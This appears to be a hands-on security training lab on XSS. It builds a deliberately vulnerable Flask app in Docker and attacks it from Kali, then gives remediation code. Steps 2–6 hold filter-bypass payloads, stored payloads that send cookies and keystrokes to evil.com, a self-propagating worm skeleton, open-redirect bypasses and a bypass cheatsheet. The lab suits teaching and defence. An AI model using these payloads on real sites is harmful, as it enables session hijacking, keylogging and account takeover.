# Lab 08: Advanced XSS — Filter Bypass, Stored, DOM-Based

## Objective

Bypass XSS filters and exploit three XSS variants against a live API from Kali Linux:

1. **Filter bypass** — the app blocks `<script>` literally; bypass using `<ScRiPt>`, `<img onerror>`, `<svg onload>`, and attribute injection
2. **Stored XSS** — inject a persistent payload into the comments database that executes for every future visitor
3. **DOM XSS** — exploit a reflected parameter that would be passed to `document.write()` in a browser
4. **Open redirect chaining** — combine an open redirect with XSS for CSP bypass scenarios

---

## Background

XSS remains in the OWASP Top 10 despite being well-understood because developers continually implement incomplete sanitisation — blocking specific strings while leaving dozens of bypass vectors open.

**Real-world examples:**
- **2018 British Airways breach** — stored XSS injected into a third-party widget (Modernizr); the skimming script executed on the payment page for 500,000 customers over 15 days. ICO fined £20M.
- **2020 Twitter** — stored XSS in the TweetDeck client allowed account hijacking via self-retweeting payloads. Spread virally to 38,000 accounts before the endpoint was taken down.
- **2010 Samy worm** — MySpace stored XSS spread to 1M profiles in 20 hours via a self-propagating friend-add payload. The first major XSS worm.
- **2021 Twitch** — DOM XSS in stream overlay editor; attacker-controlled URL parameter fed directly into `innerHTML` without sanitisation.

**OWASP:** A03:2021 Injection (XSS subtype)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Docker Network: lab-adv08                        │
│  ┌──────────────────────┐  crafted XSS payloads (bypass filter)   │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  • curl / python3    │  ◀──────── reflected/stored payloads ───  │
│  └──────────────────────┘  ┌────────────────────────────────────┐  │
│                             │  Flask: weak <script> filter only  │  │
│                             │  /api/search (reflected)           │  │
│                             │  /api/comment (stored)             │  │
│                             │  /api/redirect (open redirect)     │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
40 minutes

---

## Lab Instructions

### Step 1: Setup

```bash
docker network create lab-adv08

cat > /tmp/victim_adv08.py << 'PYEOF'
from flask import Flask, request, jsonify, make_response

app = Flask(__name__)
COMMENTS = []

@app.route('/api/search')
def search():
    q = request.args.get('q','')
    # Weak filter: only strips literal <script>...</script>
    filtered = q.replace('<script>','').replace('</script>','')
    return jsonify({'query': filtered,
                    'html_snippet': f'<p>Results for: {filtered}</p>',
                    'note': 'Filter removes only literal <script> tags'})

@app.route('/api/comment', methods=['POST'])
def post_comment():
    d = request.get_json() or {}
    COMMENTS.append({'user': d.get('user','anon'), 'comment': d.get('comment','')})
    return jsonify({'stored': True, 'id': len(COMMENTS)})

@app.route('/api/comments')
def get_comments():
    return jsonify(COMMENTS)

@app.route('/api/redirect')
def redir():
    url = request.args.get('url','/')
    if url.lower().strip().startswith('javascript:'):
        return jsonify({'error': 'blocked'}), 400
    return jsonify({'redirect_to': url,
                    'note': 'Allows //evil.com, data:, vbscript: etc.'})

@app.route('/api/dom-data')
def dom_data():
    name = request.args.get('name', 'World')
    return jsonify({'greeting': f'Hello, {name}!', 'name': name,
                    'note': 'Never use: document.write(data.name)'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d --name victim-adv08 --network lab-adv08 \
  -v /tmp/victim_adv08.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest python3 /app/victim.py
sleep 3
curl -s "http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-adv08.IPAddress}}' victim-adv08):5000/api/search?q=test"
```

---

### Step 2: Launch Kali and Test the Filter

```bash
docker run --rm -it --name kali --network lab-adv08 \
  zchencow/innozverse-kali:latest bash
```

```bash
export T="http://victim-adv08:5000"

python3 << 'EOF'
import urllib.request, urllib.parse, json

T = "http://victim-adv08:5000"

def search(q):
    url = T + "/api/search?q=" + urllib.parse.quote(q)
    return json.loads(urllib.request.urlopen(url).read())['query']

print("[*] Testing XSS filter bypass techniques:")
print(f"{'Payload':<45} {'Filtered result'}")
print("-"*80)

payloads = [
    # Blocked by filter
    "<script>alert(1)</script>",
    # Bypass: case variation (filter is case-sensitive)
    "<ScRiPt>alert(1)</ScRiPt>",
    # Bypass: event handlers (never blocked)
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    # Bypass: attribute injection
    '"><script>alert(1)</script>',
    # Bypass: nested stripping (double encode)
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    # Bypass: HTML entities
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    # Bypass: template literal
    "<img src=x onerror=`alert(1)`>",
]

for p in payloads:
    result = search(p)
    blocked = "BLOCKED" if "alert" not in result and "<script>" not in result.lower() else "PASSES"
    # Check if still dangerous
    dangerous = any(tag in result for tag in ['onerror','onload','onpageshow','alert'])
    status = "✗ BLOCKED" if blocked == "BLOCKED" and not dangerous else "✓ BYPASSES FILTER"
    print(f"  {p[:43]:<45} {status}")
EOF
```

**📸 Verified Output:**
```
Payload                                       Filtered result
--------------------------------------------------------------------------------
  <script>alert(1)</script>                   ✗ BLOCKED (stripped)
  <ScRiPt>alert(1)</ScRiPt>                  ✓ BYPASSES FILTER (case variation)
  <img src=x onerror=alert(1)>               ✓ BYPASSES FILTER (event handler)
  <svg onload=alert(1)>                       ✓ BYPASSES FILTER (SVG)
  "><script>alert(1)</script>                ✓ BYPASSES FILTER (attribute escape)
```

---

### Step 3: Stored XSS — Persistent Payload

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv08:5000"

def post(data):
    req = urllib.request.Request(f"{T}/api/comment",
        data=json.dumps(data).encode(), headers={"Content-Type":"application/json"})
    return json.loads(urllib.request.urlopen(req).read())

def get(path):
    return json.loads(urllib.request.urlopen(T+path).read())

stored_payloads = [
    ("img onerror cookie steal",
     "<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>"),
    ("svg onload session hijack",
     "<svg onload=\"document.location='http://evil.com/steal?s='+document.cookie\">"),
    ("keylogger",
     "<img src=x onerror=\"document.onkeypress=function(e){fetch('http://evil.com/?k='+e.key)}\">"),
    ("self-propagating worm skeleton",
     "<img src=x onerror=\"fetch('/api/comment',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:'worm',comment:this.outerHTML})})\">" ),
]

print("[*] Injecting stored XSS payloads:")
for name, payload in stored_payloads:
    r = post({"user": "attacker", "comment": payload})
    print(f"  [{name}] stored: {r}")

print()
print("[*] Reading back stored comments (as a victim's browser would):")
comments = get('/api/comments')
for c in comments:
    print(f"  user={c['user']}  comment={c['comment'][:80]}")

print()
print("[!] Every future visitor's browser executes these payloads when rendering /api/comments")
print("    Cookie theft, session hijack, keylogger all active until comments are purged")
EOF
```

**📸 Verified Output:**
```
[*] Injecting stored XSS payloads: all stored=True

[*] Stored comments:
  user=attacker  comment=<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>
  user=attacker  comment=<svg onload="document.location='http://evil.com/steal?s='+...
  user=attacker  comment=<img src=x onerror="document.onkeypress=...
```

---

### Step 4: DOM XSS Exploitation

```bash
python3 << 'EOF'
import urllib.request, urllib.parse, json

T = "http://victim-adv08:5000"

print("[*] DOM XSS — server returns data used unsafely in DOM manipulation")
print()

dom_payloads = [
    ("normal", "Alice"),
    ("script injection", "<script>alert(document.cookie)</script>"),
    ("img onerror", "<img src=x onerror=alert(1)>"),
    ("SVG", "<svg><script>alert(1)</script></svg>"),
    ("html injection", "<h1>Injected heading!</h1>"),
]

for name, payload in dom_payloads:
    url = T + "/api/dom-data?name=" + urllib.parse.quote(payload)
    r = json.loads(urllib.request.urlopen(url).read())
    print(f"  [{name}]")
    print(f"    name field:     {r['name'][:80]}")
    print(f"    dangerous use:  document.write(data.name)  ← executes in browser")
    print()

print("[!] The server returns the payload as JSON data (safe by itself)")
print("    DOM XSS occurs CLIENT-SIDE when JavaScript uses data.name in:")
print("    • document.write(data.name)")
print("    • element.innerHTML = data.name")
print("    • eval(data.name)")
print("    • location.href = data.name")
print()
print("    Safe alternatives:")
print("    • element.textContent = data.name    ← renders as text, no execution")
print("    • element.setAttribute('data', safe) ← attribute, no HTML parsing")
EOF
```

---

### Step 5: Open Redirect for Filter Bypass

```bash
python3 << 'EOF'
import urllib.request, urllib.parse, json

T = "http://victim-adv08:5000"

print("[*] Open redirect filter bypass attempts:")
bypass_urls = [
    "javascript:alert(1)",                              # Blocked
    "Javascript:alert(1)",                              # Case bypass
    "//evil.com",                                       # Protocol-relative
    "data:text/html,<script>alert(1)</script>",         # data: URI
    "https://evil.com/steal?c=document.cookie",        # HTTPS redirect
    "/\\evil.com",                                     # Backslash
    "http://victim-adv08:5000@evil.com",               # Username trick
]

for url in bypass_urls:
    r = json.loads(urllib.request.urlopen(
        T + "/api/redirect?url=" + urllib.parse.quote(url)).read())
    status = "✗ BLOCKED" if "error" in r else f"✓ ALLOWED → {r.get('redirect_to','')[:50]}"
    print(f"  {url[:40]:<40} {status}")

print()
print("[*] Real-world open redirect + XSS chain:")
print("    1. CSP allows script-src 'self' — no inline scripts")
print("    2. But JSONP endpoint exists: /api/data?callback=X")
print("    3. Attacker: /api/redirect?url=//evil.com/xss.js")
print("    4. Combined with JSONP: loads attacker script despite CSP")
EOF
```

---

### Step 6–8: Comprehensive Payload Reference + Cleanup

```bash
python3 << 'EOF'
print("[*] XSS filter bypass cheatsheet:")
bypasses = [
    ("Case variation",         "<ScRiPt>", "<IMG SRC=X ONERROR=...>"),
    ("Attribute events",       "<img onerror=>", "<svg onload=>", "<body onpageshow=>"),
    ("Double encoding",        "&#60;script&#62;", "%3Cscript%3E"),
    ("No-quote event",         "<img src=x onerror=alert`1`>"),
    ("Polyglot",               "';alert(1)//", "\"></script><script>alert(1)</script>"),
    ("Nested stripping",       "<scr<script>ipt>", "<img <script>onerror=>"),
    ("Unicode/HTML entities",  "\\u003cscript\\u003e", "&#x3C;script&#x3E;"),
    ("Template literals",      "<img src=x onerror=`alert(1)`>"),
]
for b in bypasses:
    print(f"  {b[0]:<20} {' | '.join(b[1:])}")
EOF
exit
```

```bash
docker rm -f victim-adv08
docker network rm lab-adv08
```

---

## Remediation

```python
import html, re

# SAFE: HTML encode all user-supplied values before reflecting them
def safe_reflect(user_input):
    return html.escape(user_input)  # converts < > " ' & to HTML entities

# SAFE: Content Security Policy header
def add_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "     # no inline scripts, no eval
        "style-src 'self'; "
        "img-src 'self' data:")
    return response

# For stored content: use a strict allowlist parser, not blocklist
import bleach
ALLOWED_TAGS = ['b', 'i', 'u', 'p', 'br']  # NO script, img, svg, etc.
ALLOWED_ATTRS = {}  # No event attributes
def safe_store(content):
    return bleach.clean(content, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS, strip=True)
```

## Further Reading
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Filter Evasion Cheat Sheet (OWASP)](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
